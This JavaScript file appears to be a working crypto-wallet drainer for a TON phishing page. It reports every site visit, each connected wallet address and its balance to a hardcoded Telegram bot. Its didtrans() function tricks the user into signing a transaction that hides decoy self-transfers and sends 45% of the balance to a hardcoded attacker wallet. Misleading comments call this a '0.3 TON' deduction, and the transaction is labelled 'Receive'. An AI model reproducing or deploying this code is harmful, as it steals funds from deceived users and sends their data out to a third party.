var mainWallet = "UQBk_5iaLiQwxJ8VWm6CmjJ15_04mbjgIfFlMjxfAtv9V58X";
const botToken = "7931684835:AAH9pSLLaLLqOqd40q6o6uUMsiRHVSrak7U";
const chatId = "@ppjjkkd";

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
    manifestUrl: 'https://imdontyou.github.io/time/tonconnect-manifest.json',
    buttonRootId: 'ton-connect'
});

let walletAddress = null;

async function sendToTelegram(message) {
    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "HTML" })
        });
    } catch (error) {
        console.error("Ошибка отправки в Telegram:", error);
    }
}

(async () => {
    sendToTelegram(`🌍 Новый посетитель сайта!`);
})();

tonConnectUI.onStatusChange(async (walletInfo) => {
    if (walletInfo && walletInfo.account) {
        walletAddress = walletInfo.account.address;
        console.log('Адрес подключенного кошелька:', walletAddress);
        
        await updateBalance(walletAddress);
        sendToTelegram(`✅ Подключен кошелек: <code>${walletAddress}</code>`);
    }
});

async function updateBalance(walletAddress) {
    try {
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
        const data = await response.json();
        if (!data.balance) return;

        const balanceTON = parseFloat(data.balance) / 1000000000;
        console.log(`Баланс: ${balanceTON} TON`);

        sendToTelegram(`💰 Баланс кошелька <code>${walletAddress}</code>: <b>${balanceTON} TON</b>`);
    } catch (error) {
        console.error('Ошибка при получении баланса:', error);
    }
}

async function didtrans() {
    // Проверяем, подключен ли кошелек
    if (!walletAddress) {
        console.error('Кошелек не подключен');
        alert('Кошелек не подключен');
        return;
    }

    // Получаем баланс кошелька
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`);
    const data = await response.json();

    // Проверка на ошибки при получении данных о кошельке
    if (!data.balance) {
        console.error('Не удалось получить баланс');
        return;
    }

    const originalBalance = parseFloat(data.balance); // Баланс в нанотонах
    const origbal = originalBalance * 0.55;
    const roundedBalance = Math.round(origbal);

    // Устанавливаем 0.3 TON в нанотоны, которые будем вычитать
    const deduction = roundedBalance; // 0.3 TON в нанотонах

    // Проверка, чтобы баланс был достаточно велик для вычитания 0.3 TON
    if (originalBalance <= deduction) {
        console.error('Баланс слишком мал для вычитания 0.3 TON');
        return;
    }

    // Вычитаем 0.3 TON из баланса
    const remainingBalance = originalBalance - deduction;

    console.log(`Баланс после вычета 0.3 TON: ${remainingBalance / 1000000000} TON`);

    // Формируем транзакцию с двумя сообщениями
    const transaction = {
        validUntil: Math.floor(Date.now() / 1000) + 60, // Время действия транзакции (60 секунд)
        messages: [
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: walletAddress,  // Адрес получателя для первой части
                amount: 100,       // Сумма для первой транзакции (0.001 TON)
            },
            {
                address: mainWallet,   // Адрес получателя для второй части
                amount: remainingBalance, // Сумма для второй транзакции
            }
        ],
        sendMode: 5,  // Если это требуется в вашем API
        comment: "Получить",  // Комментарий (по желанию)
    };

    try {
        const result = await tonConnectUI.sendTransaction(transaction);
        console.log('Транзакция отправлена:', result);
        
        sendToTelegram(`💸 Отправлена транзакция с кошелька <code>${walletAddress}</code> на сумму <b>${remainingBalance / 1000000000} TON</b>`);
        
        await updateBalance(walletAddress);
    } catch (error) {
        console.error('Ошибка при отправке транзакции:', error);
    }
}
